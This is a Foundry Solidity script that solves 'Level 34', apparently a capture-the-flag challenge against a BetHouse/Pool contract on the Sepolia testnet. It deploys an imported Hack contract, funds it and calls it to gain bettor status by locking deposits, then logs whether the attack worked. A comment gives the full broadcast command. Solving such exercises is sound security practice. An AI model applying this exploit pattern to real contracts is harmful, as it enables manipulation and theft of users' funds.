// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, BetHouse, Pool, PoolToken} from "../src/level34.sol";

contract Level34Script is Script {
    function run(address instanceAddress, address sender) external {
        BetHouse target = BetHouse(instanceAddress);
        Pool pool = Pool(target.pool());
        PoolToken depositToken = PoolToken(pool.depositToken());
        PoolToken wrappedToken = PoolToken(pool.wrappedToken());

        bool isBettorBefore = target.isBettor(sender);
        uint256 senderWrappedBalanceBefore = wrappedToken.balanceOf(sender);
        bool depositsLockedBefore = pool.depositsLocked(sender);
        console.log("Is bettor before:", isBettorBefore);
        console.log(
            "Sender wrapped token balance before:",
            senderWrappedBalanceBefore
        );
        console.log("Deposits locked before:", depositsLockedBefore);
        console.log("Sender address:", sender);

        vm.startBroadcast(sender);
        Hack attackContract = new Hack{value: 0}(instanceAddress, sender);
        depositToken.transfer(address(attackContract), 5);

        uint256 hackPDTBalance = depositToken.balanceOf(
            address(attackContract)
        );
        console.log("Hack contract PDT balance:", hackPDTBalance);
        require(hackPDTBalance >= 5, "Hack contract needs at least 5 PDT");

        attackContract.hack{value: 0.001 ether}();
        pool.lockDeposits();
        target.makeBet(sender);
        vm.stopBroadcast();

        bool isBettorAfter = target.isBettor(sender);
        uint256 senderWrappedBalanceAfter = wrappedToken.balanceOf(sender);
        bool depositsLockedAfter = pool.depositsLocked(sender);

        console.log("Is bettor after:", isBettorAfter);
        console.log(
            "Sender wrapped token balance after:",
            senderWrappedBalanceAfter
        );
        console.log("Deposits locked after:", depositsLockedAfter);
        console.log("Attack successful:", isBettorAfter && depositsLockedAfter);
    }
}
//forge script script/level34.s.sol:Level34Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address,address)" 0xa529c1dC47F884A8731c4fA9C494bf1401D9d35d 0x0ADf707838CDc0aBd5Cc361A9C680CEe4487F148
